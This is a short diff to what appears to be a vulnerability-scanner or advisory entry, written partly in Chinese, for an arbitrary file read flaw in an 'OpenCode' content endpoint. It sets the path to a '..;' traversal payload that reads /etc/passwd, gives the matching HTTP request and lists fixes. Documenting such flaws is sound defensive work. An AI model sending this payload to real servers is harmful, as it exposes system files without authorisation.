@@ -1,7 +1,7 @@
 vendor = "OpenCode"
 name = "OpenCode content 接口任意文件读取漏洞"
 type = "任意文件读取"
-path = "/content/"
+path = "/content/..;/etc/passwd"
 detail = """GET /content/..;/etc/passwd HTTP/1.1 Host: target
 通过 ..; 路径遍历绕过读取任意文件"""
 fix = "对路径参数做规范化校验，过滤 ..; 等路径穿越序列；WAF 拦截路径遍历特征；限制接口仅允许内网访问。"
